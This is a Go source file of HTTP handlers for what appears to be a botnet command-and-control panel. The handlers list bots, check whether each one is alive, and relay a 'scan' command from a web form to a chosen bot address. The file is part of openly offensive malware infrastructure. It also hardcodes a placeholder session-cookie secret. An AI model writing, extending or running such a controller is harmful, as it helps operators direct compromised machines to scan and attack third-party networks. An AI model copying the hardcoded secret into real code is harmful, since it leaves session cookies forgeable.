package http

import (
	"log"
	"net/http"
	"sync"

	"github.com/gorilla/sessions"
	"github.com/threeaccents/botnet"

	"github.com/alecthomas/template"
)

var store = sessions.NewCookieStore([]byte("something-very-secret"))

//ListBotsData is
type ListBotsData struct {
	Bots []*botnet.Bot
}

func (h *Handler) handleListBots() http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		bots, err := h.Storage.ListBots()
		if err != nil {
			w.Write([]byte("we have an error"))
			return
		}

		tmpl := template.Must(template.ParseFiles("../../http/templates/list_bots.html"))

		data := ListBotsData{
			Bots: bots,
		}

		tmpl.Execute(w, data)
	})
}

func (h *Handler) handleCheckBotsHealth() http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		bots, err := h.Storage.ListBots()
		if err != nil {
			w.Write([]byte("we have an error"))
			return
		}
		wg := new(sync.WaitGroup)
		wg.Add(len(bots))
		for _, bot := range bots {
			go h.checkBotHealth(bot, wg)
		}
		wg.Wait()
		botnet.Msg("finished checking bots health")
		http.Redirect(w, r, "http://localhost:8000/bots", 301)
	})
}

func (h *Handler) handleCommand() http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		r.ParseForm()
		addr := r.PostFormValue("addr")
		command := r.PostFormValue("command")
		switch command {
		case "scan":
			if err := h.CommanderService.ScanCmd(addr); err != nil {
				w.Write([]byte(err.Error()))
				return
			}
		}
		http.Redirect(w, r, "http://localhost:8000/bots", 301)
	})
}

// Iffy function come back to it later
func (h *Handler) checkBotHealth(bot *botnet.Bot, wg *sync.WaitGroup) {
	defer wg.Done()

	if err := h.CommanderService.CheckBotHealth(bot); err != nil {
		bot.IsAlive = false
		if _, err := h.Storage.UpdateBot(bot); err != nil {
			log.Panic(err)
		}
		return
	}
	bot.IsAlive = true
	if _, err := h.Storage.UpdateBot(bot); err != nil {
		log.Panic(err)
	}
}
